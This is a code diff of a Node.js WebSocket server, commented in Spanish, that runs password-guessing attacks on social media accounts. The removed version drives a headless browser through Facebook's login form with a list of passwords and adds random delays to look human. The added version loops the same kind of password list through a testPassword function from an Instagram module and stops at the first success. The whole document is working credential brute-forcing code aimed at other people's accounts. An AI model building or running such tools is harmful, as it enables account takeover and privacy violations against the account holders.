@@ -1,114 +1,52 @@
-const express = require('express');
-const http = require('http');
 const WebSocket = require('ws');
-const puppeteer = require('puppeteer-core'); // Usamos puppeteer-core
+const express = require('express');
+const { testPassword } = require('./instagram');
+require('dotenv').config();
 
+// Configuración del servidor HTTP y WebSocket
 const app = express();
-const server = http.createServer(app);
+const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Función para simular retraso humano
-const humanLikeDelay = async () => {
-  await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
-};
+// Servir el frontend
+app.use(express.static('public'));
 
-// Función de inicio de sesión
-const loginToFacebook = async (page, identifier, password) => {
-  try {
-    await page.goto('https://www.facebook.com', { waitUntil: 'networkidle2' });
-    await humanLikeDelay();
-
-    // Limpiar campos existentes
-    await page.evaluate(() => {
-      document.querySelector('#email').value = '';
-      document.querySelector('#pass').value = '';
-    });
-
-    await page.type('#email', identifier);
-    await humanLikeDelay();
-    
-    await page.type('#pass', password);
-    await humanLikeDelay();
-    
-    await page.click('button[name="login"]');
-    await humanLikeDelay();
-
-    try {
-      await page.waitForSelector('div[aria-label="Cuenta"]', { timeout: 5000 });
-      return { success: true, password };
-    } catch (error) {
-      return { success: false, password };
-    }
-  } catch (error) {
-    return { success: false, password, error: error.message };
-  }
-};
-
-// Configurar WebSocket
+// Manejo de conexiones WebSocket
 wss.on('connection', (ws) => {
-  console.log('Cliente conectado');
+  console.log('New client connected');
 
   ws.on('message', async (message) => {
-    try {
-      const data = JSON.parse(message);
-      if (data.type === 'startLogin') {
-        const { identifier, passwords } = data;
-        
-        const browser = await puppeteer.launch({
-          headless: true,
-          executablePath: process.env.CHROMIUM_PATH || '/usr/bin/chromium-browser', // Ruta de Chromium en Render
-          args: ['--no-sandbox', '--disable-setuid-sandbox']
-        });
-        
-        const page = await browser.newPage();
-        await page.setViewport({ width: 1280, height: 800 });
+    const data = JSON.parse(message);
 
-        for (const password of passwords) {
-          if (ws.readyState !== WebSocket.OPEN) break;
-          
-          const result = await loginToFacebook(page, identifier, password);
-          if (ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify(result));
-          }
-          
-          if (result.success) break;
-          
-          // Volver a la página de login
-          await page.goto('https://www.facebook.com/login', { waitUntil: 'networkidle2' });
-          await humanLikeDelay();
-        }
+    if (data.type === 'startLogin') {
+      const { username, passwords } = data;
 
-        await browser.close();
-        if (ws.readyState === WebSocket.OPEN) {
+      // Probar cada contraseña línea por línea
+      for (const password of passwords) {
+        const result = await testPassword(username, password);
+
+        // Enviar el resultado al frontend
+        ws.send(JSON.stringify(result));
+
+        // Si la contraseña es correcta, detener el proceso
+        if (result.success) {
           ws.send(JSON.stringify({ type: 'finished' }));
+          break;
         }
       }
-    } catch (error) {
-      console.error('Error:', error);
-      if (ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ 
-          type: 'error',
-          message: `Error del servidor: ${error.message}`
-        }));
-      }
+
+      // Indicar que el proceso ha terminado
+      ws.send(JSON.stringify({ type: 'finished' }));
     }
   });
 
   ws.on('close', () => {
-    console.log('Cliente desconectado');
+    console.log('Client disconnected');
   });
 });
 
-// Servir archivos estáticos
-app.use(express.static('public'));
-
-// Ruta principal
-app.get('/', (req, res) => {
-  res.sendFile(__dirname + '/public/index.html');
-});
-
-// Iniciar servidor
-const PORT = process.env.PORT || 3000;
+// Iniciar el servidor
+const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-  console.log(`Servidor en ejecución en http://localhost:${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
